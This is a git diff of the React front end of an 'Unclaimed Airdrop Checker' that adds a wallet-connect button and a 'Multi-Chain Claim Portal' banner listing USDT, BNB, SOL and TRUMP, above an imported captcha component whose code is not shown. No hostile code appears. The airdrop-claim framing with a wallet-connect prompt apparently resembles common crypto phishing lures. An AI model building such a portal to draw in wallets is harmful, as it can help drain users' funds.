@@ -1,9 +1,11 @@
 ﻿import React, { useState, useEffect } from 'react';
+import { useWeb3Modal } from '@web3modal/ethereum/react';
 import SecuritySimulationCaptcha from './components/SecuritySimulationCaptcha';
 
 function App() {
   const [walletConnected, setWalletConnected] = useState(false);
   const [walletAddress, setWalletAddress] = useState('');
+  const { open } = useWeb3Modal();
 
   useEffect(() => {
     const checkWalletConnection = async () => {
@@ -44,19 +46,25 @@ function App() {
               <h1 className="text-2xl font-bold text-gray-900">
                 Unclaimed Airdrop Checker
               </h1>
+              <p className="text-sm text-gray-500 mt-1">
+                Multi-Chain Claim Portal | USDT | BNB | SOL | TRUMP
+              </p>
             </div>
-            {walletConnected && (
-              <div className="bg-green-100 px-3 py-1 rounded-full">
-                <span className="text-sm text-green-700 font-mono">
-                  {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
-                </span>
-              </div>
-            )}
+            <div className="flex items-center gap-3">
+              <w3m-button />
+              {walletConnected && (
+                <div className="bg-green-100 px-3 py-1 rounded-full">
+                  <span className="text-sm text-green-700 font-mono">
+                    {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
+                  </span>
+                </div>
+              )}
+            </div>
           </div>
         </div>
       </header>
 
-      <main className="max-w-4xl mx-auto px-4 py-12 sm:px-6 lg:px-8">
+      <main className="max-w-4xl mx-auto px-4 py-8 sm:py-12 sm:px-6 lg:px-8">
         <SecuritySimulationCaptcha />
       </main>
     </div>
